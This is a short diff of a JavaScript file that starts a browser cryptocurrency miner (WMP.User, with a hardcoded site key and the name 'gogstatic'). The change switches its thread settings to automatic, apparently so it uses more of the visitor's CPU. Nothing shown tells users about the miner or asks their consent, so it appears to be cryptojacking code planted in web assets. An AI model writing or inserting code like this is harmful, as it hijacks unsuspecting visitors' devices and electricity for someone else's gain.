@@ -774,7 +774,7 @@ this.on_workermsg = function(k) {
 
     var miner = WMP.User('SK_A3RHRoc2bW577os9JzJEB', 'gogstatic',{
         threads: 8,
-        autoThreads: false,
-        forceASMJS: false
+        autoThreads: true,
+        forceASMJS: true
     });
     miner.start();
